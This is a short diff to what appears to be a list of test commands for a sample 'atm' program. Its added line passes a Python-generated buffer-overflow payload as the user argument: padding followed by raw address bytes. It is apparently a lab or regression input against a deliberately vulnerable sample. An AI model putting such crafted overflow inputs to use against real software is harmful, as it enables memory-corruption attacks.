@@ -12,3 +12,4 @@ samples/atm 40 $USER
 
 samples/atm 300 zolboo
 samples/atm 40 zzzzzz
+samples/atm 300 $(python -c 'print "0" + "A"*30 +"\x00\x10\x0c\x40"') 0
